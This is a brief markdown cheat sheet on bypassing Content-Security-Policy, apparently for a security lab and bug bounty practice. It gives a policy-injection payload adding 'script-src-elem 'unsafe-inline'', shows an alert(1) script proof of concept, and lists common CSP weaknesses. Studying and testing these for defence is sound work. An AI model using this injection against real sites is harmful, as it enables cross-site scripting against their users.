# CSP Bypass CheatSheet

## Goal

Execute JavaScript despite:

```http
Content-Security-Policy
```

---

# Policy Injection

Payload:

```text
;script-src-elem 'unsafe-inline'
```

---

# Why It Works

Original:

```http
script-src 'self'
```

---

Injected:

```http
script-src 'self';
script-src-elem 'unsafe-inline'
```

---

# Result

```html
<script>alert(1)</script>
```

executes.

---

# Common CSP Weaknesses

## Unsafe Inline

```http
'unsafe-inline'
```

---

## Unsafe Eval

```http
'unsafe-eval'
```

---

## Wildcards

```http
*
```

---

## Trusted Third Parties

```http
cdn.example.com
```

---

# Attack Flow

```text
Weak CSP
        ↓
Script Execution
        ↓
XSS
```

---

# Related Lab

```text
Lab30
```

---

# Bug Bounty Reminder

Always inspect:

```http
Content-Security-Policy
```

headers manually.